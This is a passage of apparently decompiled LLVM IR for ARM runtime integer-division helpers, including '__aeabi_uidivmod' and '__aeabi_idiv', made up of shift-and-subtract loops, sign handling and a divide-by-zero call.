.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_12908 = phi i32 [ %v6_128fc, %bb85 ], [ %v1_128fc, %.thread7 ], [ %v6_128fc, %bb86 ]
  %v1_1290c = phi i32 [ %v1_12900, %bb85 ], [ %v1_12900, %.thread7 ], [ %v6_12900, %bb86 ]
  %v4_12904 = udiv i32 %v1_12924, 4
  %v6_12904 = icmp ult i32 %v1_12908, %v4_12904
  br i1 %v6_12904, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_12908 = and i32 %v1_12924, 2
  %v4_12908 = icmp eq i32 %v3_12908, 0
  %v6_12908 = sub i32 %v1_12908, %v4_12904
  store i32 %v6_12908, i32* %r0.global-to-local, align 4
  br i1 %v4_12908, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_1290c = udiv i32 %v1_12920, 4
  %v6_1290c = or i32 %v1_1290c, %v5_1290c
  store i32 %v6_1290c, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_12914 = phi i32 [ %v6_12908, %bb87 ], [ %v1_12908, %.thread8 ], [ %v6_12908, %bb88 ]
  %v1_12918 = phi i32 [ %v1_1290c, %bb87 ], [ %v1_1290c, %.thread8 ], [ %v6_1290c, %bb88 ]
  %v4_12910 = udiv i32 %v1_12924, 8
  %v6_12910 = icmp ult i32 %v1_12914, %v4_12910
  br i1 %v6_12910, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_12914 = and i32 %v1_12924, 4
  %v4_12914 = icmp eq i32 %v3_12914, 0
  %v6_12914 = sub i32 %v1_12914, %v4_12910
  store i32 %v6_12914, i32* %r0.global-to-local, align 4
  br i1 %v4_12914, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_12918 = udiv i32 %v1_12920, 8
  %v6_12918 = or i32 %v1_12918, %v5_12918
  store i32 %v6_12918, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_1292c = phi i32 [ %v1_12918, %bb89 ], [ %v1_12918, %.thread9 ], [ %v6_12918, %bb90 ]
  %v0_1291c = phi i32 [ %v6_12914, %bb89 ], [ %v1_12914, %.thread9 ], [ %v6_12914, %bb90 ]
  %v2_1291c = icmp eq i32 %v0_1291c, 0
  br i1 %v2_1291c, label %dec_label_pc_1292c, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_12920, 16
  br i1 %tmp138, label %dec_label_pc_1292c, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_12920 = udiv i32 %v1_12920, 16
  %v4_12924 = udiv i32 %v1_12924, 16
  br label %dec_label_pc_128ec

dec_label_pc_1292c:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_1292c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1292c

dec_label_pc_12934:                               ; preds = %dec_label_pc_128a0
  %v9_128a0 = icmp eq i32 %v0_128a0, %v1_128a0
  %. = zext i1 %v9_128a0 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_12940:                               ; preds = %dec_label_pc_128a8
  %v2_12940 = icmp ugt i32 %v1_128a0, 65535
  br i1 %v2_12940, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_12940
  %v2_12944 = and i32 %v1_128a0, 32768
  %v3_12944 = icmp eq i32 %v2_12944, 0
  %v4_12944 = udiv i32 %v1_128a0, 65536
  br i1 %v3_12944, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_12940
  %v0_1295065 = phi i32 [ %v1_128a0, %dec_label_pc_12940 ], [ %v4_12944, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_12954 = phi i32 [ %v0_1295065, %.thread16 ], [ %v4_12944, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_12950 = icmp ugt i32 %v1_12954, 255
  br i1 %v2_12950, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_12954 = and i32 %v1_12954, 128
  %v3_12954 = icmp eq i32 %v2_12954, 0
  %v4_12954 = udiv i32 %v1_12954, 256
  br i1 %v3_12954, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_12958 = or i32 %storemerge, 8
  store i32 %v2_12958, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_12964 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_12958, %bb98 ]
  %v1_12960 = phi i32 [ %v1_12954, %bb96 ], [ %v4_12954, %bb97 ], [ %v4_12954, %bb98 ]
  %v2_1295c = icmp ugt i32 %v1_12960, 15
  br i1 %v2_1295c, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_12960 = and i32 %v1_12960, 8
  %v3_12960 = icmp eq i32 %v2_12960, 0
  %v4_12960 = udiv i32 %v1_12960, 16
  br i1 %v3_12960, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_12964 = add nsw i32 %v1_12964, 4
  store i32 %v2_12964, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_1296c = phi i32 [ %v1_12964, %.thread17 ], [ %v1_12964, %bb99 ], [ %v2_12964, %bb100 ]
  %v5_12970 = phi i32 [ %v1_12960, %.thread17 ], [ %v4_12960, %bb99 ], [ %v4_12960, %bb100 ]
  %v2_12968 = icmp ugt i32 %v5_12970, 3
  %v7_12968 = icmp eq i32 %v5_12970, 4
  %v2_1296c = xor i1 %v7_12968, true
  %v3_1296c = and i1 %v2_12968, %v2_1296c
  br i1 %v3_1296c, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_1296c = add nsw i32 %v4_1296c, 3
  store i32 %v5_1296c, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_12970 = phi i32 [ %v4_1296c, %.thread18 ], [ %v5_1296c, %bb101 ]
  %v2_12970 = xor i1 %v2_12968, true
  %v3_12970 = or i1 %v7_12968, %v2_12970
  br i1 %v3_12970, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_12970 = udiv i32 %v5_12970, 2
  %v9_12970 = add i32 %v4_12970, %v8_12970
  store i32 %v9_12970, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_12974 = phi i32 [ %v4_12970, %bb102 ], [ %v9_12970, %bb103 ]
  %v6_12974 = lshr i32 %v0_128a0, %v1_12974
  store i32 %v6_12974, i32* %r0.global-to-local, align 4
  ret i32 %v6_12974

dec_label_pc_1297c:                               ; preds = %entry
  %v0_12980 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_12970, { 1, 0 }
  uselistorder i1 %v7_12968, { 1, 0 }
  uselistorder i32 %v4_12960, { 1, 0 }
  uselistorder i32 %v1_12960, { 1, 0, 2, 3 }
  uselistorder i32 %v2_12958, { 1, 0 }
  uselistorder i32 %v4_12954, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12954, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12944, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_1291c, { 1, 0 }
  uselistorder i32 %v0_1292c, { 1, 0, 2 }
  uselistorder i32 %v4_12910, { 1, 0 }
  uselistorder i32 %v1_12918, { 1, 2, 0 }
  uselistorder i32 %v4_12904, { 1, 0 }
  uselistorder i32 %v1_1290c, { 1, 2, 0 }
  uselistorder i32 %v4_128f8, { 1, 0 }
  uselistorder i32 %v1_12900, { 1, 2, 0 }
  uselistorder i32 %v1_12924, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_128f4, { 1, 0 }
  uselistorder i32 %v1_12920, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_128e0, { 1, 0 }
  uselistorder i32 %v3_128dc, { 1, 0 }
  uselistorder i32 %v1_128dc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_128e0, { 1, 2, 0, 3 }
  uselistorder i32 %v4_128cc, { 1, 0 }
  uselistorder i32 %v4_128c8, { 2, 1, 0 }
  uselistorder i32 %v1_128cc, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_128d4.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_128a0, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_128a0, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_12894, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 11, 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 8, 9, 2, 7, 3, 4, 5, 6, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_1292c, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_128e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_128d4thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_12994 = udiv i32 %arg1, %arg2
  ret i32 %v2_12994
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_129a8 = load i32, i32* @r1, align 4
  %v1_129a8 = icmp slt i32 %v0_129a8, 0
  %v2_129a8 = icmp eq i32 %v0_129a8, 0
  %v2_129ac = xor i32 %v0_129a8, %arg1
  br i1 %v2_129a8, label %dec_label_pc_12ac0, label %dec_label_pc_129b4

dec_label_pc_129b4:                               ; preds = %entry
  br i1 %v1_129a8, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_129b4
  %v2_129b4 = sub i32 0, %v0_129a8
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_129b4, %bb
  %v1_12a80 = phi i32 [ %v2_129b4, %bb ], [ %v0_129a8, %dec_label_pc_129b4 ]
  %v1_129b8 = add i32 %v1_12a80, -1
  %v7_129b8 = icmp eq i32 %v1_12a80, 1
  br i1 %v7_129b8, label %dec_label_pc_12a60, label %dec_label_pc_129c0

dec_label_pc_129c0:                               ; preds = %thread-pre-split
  %v1_129c0 = icmp slt i32 %arg1, 0
  br i1 %v1_129c0, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_129c0
  %v2_129c4 = sub i32 0, %arg1
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_129c0, %bb85
  %v0_12ab4 = phi i32 [ %arg1, %dec_label_pc_129c0 ], [ %v2_129c4, %bb85 ]
  %v3_129c8 = icmp uge i32 %v0_12ab4, %v1_12a80
  %v9_129c8 = icmp eq i32 %v0_12ab4, %v1_12a80
  %v2_129cc = xor i1 %v3_129c8, true
  %v3_129cc = or i1 %v9_129c8, %v2_129cc
  br i1 %v3_129cc, label %dec_label_pc_12a6c, label %dec_label_pc_129d0

dec_label_pc_129d0:                               ; preds = %bb86
  %v2_129d0 = and i32 %v1_129b8, %v1_12a80
  %v4_129d0 = icmp eq i32 %v2_129d0, 0
  br i1 %v4_129d0, label %dec_label_pc_12a7c, label %dec_label_pc_129d8

dec_label_pc_129d8:                               ; preds = %dec_label_pc_129d0
  %v3_129d8 = icmp ult i32 %v1_12a80, 536870912
  br i1 %v3_129d8, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_129d8
  %v4_129dc = mul i32 %v1_12a80, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_129d8, %.thread
  %v0_129fc.pr40.ph = phi i32 [ %v4_129dc, %.thread ], [ %v1_12a80, %dec_label_pc_129d8 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_129d8 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_129fc.pr40 = phi i32 [ %v4_129f0, %bb89 ], [ %v0_129fc.pr40.ph, %.preheader.preheader ]
  %v1_129f4 = phi i32 [ %v4_129f4, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_129e8 = icmp ugt i32 %v0_129fc.pr40, 268435455
  br i1 %v2_129e8, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_129fcthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_129ec = icmp ult i32 %v0_129fc.pr40, %v0_12ab4
  br i1 %v4_129ec, label %bb88, label %dec_label_pc_129fcthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_129f0 = and i32 %v0_129fc.pr40, 268435456
  %v3_129f0 = icmp eq i32 %v2_129f0, 0
  %v4_129f0 = mul i32 %v0_129fc.pr40, 16
  br i1 %v3_129f0, label %bb89, label %dec_label_pc_129fc.loopexit

bb89:                                             ; preds = %bb88
  %v2_129f4 = and i32 %v1_129f4, 268435456
  %v3_129f4 = icmp eq i32 %v2_129f4, 0
  %v4_129f4 = mul i32 %v1_129f4, 16
  br i1 %v3_129f4, label %.preheader, label %dec_label_pc_129fcthread-pre-split.loopexit.loopexit

dec_label_pc_129fcthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_12a0852.ph = phi i32 [ %v1_129f4, %bb87 ], [ %v4_129f4, %bb89 ]
  %v0_129fc.pr42.ph = phi i32 [ %v0_129fc.pr40, %bb87 ], [ %v4_129f0, %bb89 ]
  br label %dec_label_pc_129fcthread-pre-split.loopexit

dec_label_pc_129fcthread-pre-split.loopexit:      ; preds = %dec_label_pc_129fcthread-pre-split.loopexit.loopexit, %.thread3
  %v1_12a0852 = phi i32 [ %v1_129f4, %.thread3 ], [ %v1_12a0852.ph, %dec_label_pc_129fcthread-pre-split.loopexit.loopexit ]
  %v0_129fc.pr42 = phi i32 [ %v0_129fc.pr40, %.thread3 ], [ %v0_129fc.pr42.ph, %dec_label_pc_129fcthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_129fcthread-pre-split

dec_label_pc_129fcthread-pre-split:               ; preds = %dec_label_pc_129fcthread-pre-split.loopexit, %bb91
  %v1_12a0850 = phi i32 [ %v1_12a0852, %dec_label_pc_129fcthread-pre-split.loopexit ], [ %v3_12a08, %bb91 ]
  %v2_12a0048 = phi i32 [ %v0_12ab4, %dec_label_pc_129fcthread-pre-split.loopexit ], [ %v2_12a00, %bb91 ]
  %v0_129fc.pr = phi i32 [ %v0_129fc.pr42, %dec_label_pc_129fcthread-pre-split.loopexit ], [ %v3_12a04, %bb91 ]
  br label %dec_label_pc_129fc

dec_label_pc_129fc.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_129fc

dec_label_pc_129fc:                               ; preds = %dec_label_pc_129fc.loopexit, %dec_label_pc_129fcthread-pre-split
  %v1_12a08 = phi i32 [ %v1_12a0850, %dec_label_pc_129fcthread-pre-split ], [ %v1_129f4, %dec_label_pc_129fc.loopexit ]
  %v2_12a00 = phi i32 [ %v2_12a0048, %dec_label_pc_129fcthread-pre-split ], [ %v0_12ab4, %dec_label_pc_129fc.loopexit ]
  %v1_12a04 = phi i32 [ %v0_129fc.pr, %dec_label_pc_129fcthread-pre-split ], [ %v4_129f0, %dec_label_pc_129fc.loopexit ]
  %v2_129fc = icmp slt i32 %v1_12a04, 0
  br i1 %v2_129fc, label %dec_label_pc_12a10, label %bb90

bb90:                                             ; preds = %dec_label_pc_129fc
  %v4_12a00 = icmp ult i32 %v1_12a04, %v2_12a00
  br i1 %v4_12a00, label %bb91, label %dec_label_pc_12a10

bb91:                                             ; preds = %bb90
  %v3_12a04 = mul i32 %v1_12a04, 2
  %v2_12a08 = icmp slt i32 %v1_12a08, 0
  %v3_12a08 = mul i32 %v1_12a08, 2
  br i1 %v2_12a08, label %dec_label_pc_12a10, label %dec_label_pc_129fcthread-pre-split

dec_label_pc_12a10:                               ; preds = %bb90, %dec_label_pc_129fc, %bb91
  %v2_12a1c63 = phi i32 [ %v3_12a08, %bb91 ], [ %v1_12a08, %bb90 ], [ %v1_12a08, %dec_label_pc_129fc ]
  %v1_12a1455 = phi i32 [ %v3_12a04, %bb91 ], [ %v1_12a04, %bb90 ], [ %v1_12a04, %dec_label_pc_129fc ]
  br label %dec_label_pc_12a14

dec_label_pc_12a14:                               ; preds = %.thread13, %dec_label_pc_12a10
  %v1_12a48 = phi i32 [ %v4_12a48, %.thread13 ], [ %v2_12a1c63, %dec_label_pc_12a10 ]
  %v1_12a1c = phi i32 [ %v1_12a58, %.thread13 ], [ 0, %dec_label_pc_12a10 ]
  %v1_12a4c = phi i32 [ %v4_12a4c, %.thread13 ], [ %v1_12a1455, %dec_label_pc_12a10 ]
  %v1_12a18 = phi i32 [ %v0_12a44, %.thread13 ], [ %v0_12ab4, %dec_label_pc_12a10 ]
  %v3_12a14 = icmp ult i32 %v1_12a18, %v1_12a4c
  br i1 %v3_12a14, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_12a14
  %v3_12a18 = sub i32 %v1_12a18, %v1_12a4c
  %v3_12a1c = or i32 %v1_12a1c, %v1_12a48
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_12a14, %bb92
  %v1_12a24 = phi i32 [ %v1_12a18, %dec_label_pc_12a14 ], [ %v3_12a18, %bb92 ]
  %v1_12a28 = phi i32 [ %v1_12a1c, %dec_label_pc_12a14 ], [ %v3_12a1c, %bb92 ]
  %v4_12a20 = udiv i32 %v1_12a4c, 2
  %v6_12a20 = icmp ult i32 %v1_12a24, %v4_12a20
  br i1 %v6_12a20, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_12a24 = urem i32 %v1_12a4c, 2
  %v4_12a24 = icmp eq i32 %v3_12a24, 0
  %v6_12a24 = sub i32 %v1_12a24, %v4_12a20
  br i1 %v4_12a24, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_12a28 = udiv i32 %v1_12a48, 2
  %v6_12a28 = or i32 %v1_12a28, %v5_12a28
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_12a30 = phi i32 [ %v6_12a24, %bb93 ], [ %v1_12a24, %.thread8 ], [ %v6_12a24, %bb94 ]
  %v1_12a34 = phi i32 [ %v1_12a28, %bb93 ], [ %v1_12a28, %.thread8 ], [ %v6_12a28, %bb94 ]
  %v4_12a2c = udiv i32 %v1_12a4c, 4
  %v6_12a2c = icmp ult i32 %v1_12a30, %v4_12a2c
  br i1 %v6_12a2c, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_12a30 = and i32 %v1_12a4c, 2
  %v4_12a30 = icmp eq i32 %v3_12a30, 0
  %v6_12a30 = sub i32 %v1_12a30, %v4_12a2c
  br i1 %v4_12a30, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_12a34 = udiv i32 %v1_12a48, 4
  %v6_12a34 = or i32 %v1_12a34, %v5_12a34
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_12a3c = phi i32 [ %v6_12a30, %bb95 ], [ %v1_12a30, %.thread9 ], [ %v6_12a30, %bb96 ]
  %v1_12a40 = phi i32 [ %v1_12a34, %bb95 ], [ %v1_12a34, %.thread9 ], [ %v6_12a34, %bb96 ]
  %v4_12a38 = udiv i32 %v1_12a4c, 8
  %v6_12a38 = icmp ult i32 %v1_12a3c, %v4_12a38
  br i1 %v6_12a38, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_12a3c = and i32 %v1_12a4c, 4
  %v4_12a3c = icmp eq i32 %v3_12a3c, 0
  %v6_12a3c = sub i32 %v1_12a3c, %v4_12a38
  br i1 %v4_12a3c, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_12a40 = udiv i32 %v1_12a48, 8
  %v6_12a40 = or i32 %v1_12a40, %v5_12a40
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_12a58 = phi i32 [ %v1_12a40, %bb97 ], [ %v1_12a40, %.thread10 ], [ %v6_12a40, %bb98 ]
  %v0_12a44 = phi i32 [ %v6_12a3c, %bb97 ], [ %v1_12a3c, %.thread10 ], [ %v6_12a3c, %bb98 ]
  %v2_12a44 = icmp eq i32 %v0_12a44, 0
  br i1 %v2_12a44, label %dec_label_pc_12a54, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_12a48, 16
  br i1 %tmp, label %dec_label_pc_12a54, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_12a48 = udiv i32 %v1_12a48, 16
  %v4_12a4c = udiv i32 %v1_12a4c, 16
  br label %dec_label_pc_12a14

dec_label_pc_12a54:                               ; preds = %thread-pre-split12, %bb99
  %v1_12a54 = icmp slt i32 %v2_129ac, 0
  br i1 %v1_12a54, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_12a54
  %v2_12a58 = sub i32 0, %v1_12a58
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_12a60, %dec_label_pc_12a54, %bb100
  %v1_12a5c = phi i32 [ %v1_12a58, %dec_label_pc_12a54 ], [ %v2_12a58, %bb100 ], [ %arg1, %dec_label_pc_12a60 ], [ %v2_12a64, %bb101 ], [ %v1_12a7880, %bb103 ], [ %v2_12a74, %bb104 ]
  ret i32 %v1_12a5c

dec_label_pc_12a60:                               ; preds = %thread-pre-split
  br i1 %v1_129a8, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_12a60
  %v2_12a64 = sub i32 0, %arg1
  br label %.thread16

dec_label_pc_12a6c:                               ; preds = %bb86
  br i1 %v3_129c8, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_12a6c
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_12a6c, %bb102
  %v1_12a7880 = phi i32 [ %arg1, %dec_label_pc_12a6c ], [ 0, %bb102 ]
  br i1 %v9_129c8, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_12a70 = ashr i32 %v2_129ac, 31
  %v2_12a74 = or i32 %v4_12a70, 1
  br label %.thread16

dec_label_pc_12a7c:                               ; preds = %dec_label_pc_129d0
  %v2_12a7c = icmp ugt i32 %v1_12a80, 65535
  br i1 %v2_12a7c, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_12a7c
  %v2_12a80 = and i32 %v1_12a80, 32768
  %v3_12a80 = icmp eq i32 %v2_12a80, 0
  %v4_12a80 = udiv i32 %v1_12a80, 65536
  br i1 %v3_12a80, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_12a7c
  %v0_12a8c70 = phi i32 [ %v1_12a80, %dec_label_pc_12a7c ], [ %v4_12a80, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_12a90 = phi i32 [ %v0_12a8c70, %.thread19 ], [ %v4_12a80, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_12a8c = icmp ugt i32 %v1_12a90, 255
  br i1 %v2_12a8c, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_12a90 = and i32 %v1_12a90, 128
  %v3_12a90 = icmp eq i32 %v2_12a90, 0
  %v4_12a90 = udiv i32 %v1_12a90, 256
  br i1 %v3_12a90, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_12a94 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_12aa0 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_12a94, %bb108 ]
  %v1_12a9c = phi i32 [ %v1_12a90, %bb106 ], [ %v4_12a90, %bb107 ], [ %v4_12a90, %bb108 ]
  %v2_12a98 = icmp ugt i32 %v1_12a9c, 15
  br i1 %v2_12a98, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_12a9c = and i32 %v1_12a9c, 8
  %v3_12a9c = icmp eq i32 %v2_12a9c, 0
  %v4_12a9c = udiv i32 %v1_12a9c, 16
  br i1 %v3_12a9c, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_12aa0 = add nsw i32 %v1_12aa0, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_12aa8 = phi i32 [ %v1_12aa0, %.thread20 ], [ %v1_12aa0, %bb109 ], [ %v2_12aa0, %bb110 ]
  %v5_12aac = phi i32 [ %v1_12a9c, %.thread20 ], [ %v4_12a9c, %bb109 ], [ %v4_12a9c, %bb110 ]
  %v2_12aa4 = icmp ugt i32 %v5_12aac, 3
  %v7_12aa4 = icmp eq i32 %v5_12aac, 4
  %v2_12aa8 = xor i1 %v7_12aa4, true
  %v3_12aa8 = and i1 %v2_12aa4, %v2_12aa8
  br i1 %v3_12aa8, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_12aa8 = add nsw i32 %v4_12aa8, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_12aac = phi i32 [ %v4_12aa8, %.thread21 ], [ %v5_12aa8, %bb111 ]
  %v2_12aac = xor i1 %v2_12aa4, true
  %v3_12aac = or i1 %v7_12aa4, %v2_12aac
  br i1 %v3_12aac, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_12aac = udiv i32 %v5_12aac, 2
  %v9_12aac = add i32 %v4_12aac, %v8_12aac
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_12ab4 = phi i32 [ %v4_12aac, %bb112 ], [ %v9_12aac, %bb113 ]
  %v1_12ab0 = icmp slt i32 %v2_129ac, 0
  %v6_12ab4 = lshr i32 %v0_12ab4, %v1_12ab4
  %v2_12ab8 = sub i32 0, %v6_12ab4
  %v2_12ab8.v6_12ab4 = select i1 %v1_12ab0, i32 %v2_12ab8, i32 %v6_12ab4
  ret i32 %v2_12ab8.v6_12ab4

dec_label_pc_12ac0:                               ; preds = %entry
  %v0_12ac4 = call i32 @__div0()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_12aac, { 1, 0 }
  uselistorder i1 %v7_12aa4, { 1, 0 }
  uselistorder i32 %v4_12a9c, { 1, 0 }
  uselistorder i32 %v1_12a9c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12a90, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_12a90, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12a80, { 1, 0 }
  uselistorder i32 %v0_12a44, { 1, 0 }
  uselistorder i32 %v4_12a38, { 1, 0 }
  uselistorder i32 %v1_12a40, { 1, 2, 0 }
  uselistorder i32 %v4_12a2c, { 1, 0 }
  uselistorder i32 %v1_12a34, { 1, 2, 0 }
  uselistorder i32 %v4_12a20, { 1, 0 }
  uselistorder i32 %v1_12a28, { 1, 2, 0 }
  uselistorder i32 %v1_12a4c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_12a1c, { 1, 0 }
  uselistorder i32 %v1_12a48, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_12a08, { 1, 0 }
  uselistorder i32 %v3_12a04, { 1, 0 }
  uselistorder i32 %v1_12a04, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_12a00, { 1, 0 }
  uselistorder i32 %v1_12a08, { 1, 2, 0, 3 }
  uselistorder i32 %v4_129f4, { 1, 0 }
  uselistorder i32 %v4_129f0, { 2, 1, 0 }
  uselistorder i32 %v1_129f4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_129fc.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_129c8, { 1, 0 }
  uselistorder i32 %v1_12a80, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_129ac, { 1, 0, 2 }
  uselistorder i32 %v0_129a8, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @__div0, { 1, 0 }
  uselistorder i32 65535, { 93, 94, 0, 1, 9, 10, 2, 3, 22, 21, 25, 48, 24, 49, 11, 12, 4, 26, 50, 27, 51, 52, 13, 53, 23, 28, 54, 29, 55, 30, 56, 57, 58, 31, 59, 60, 14, 61, 5, 35, 62, 34, 63, 32, 64, 33, 65, 66, 15, 67, 6, 68, 69, 39, 70, 38, 71, 36, 72, 37, 73, 17, 16, 74, 75, 40, 76, 41, 77, 78, 79, 18, 80, 81, 7, 42, 82, 43, 83, 44, 84, 85, 86, 19, 87, 88, 8, 47, 89, 45, 90, 46, 91, 20, 92 }
  uselistorder i32 %arg1, { 4, 5, 6, 3, 2, 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
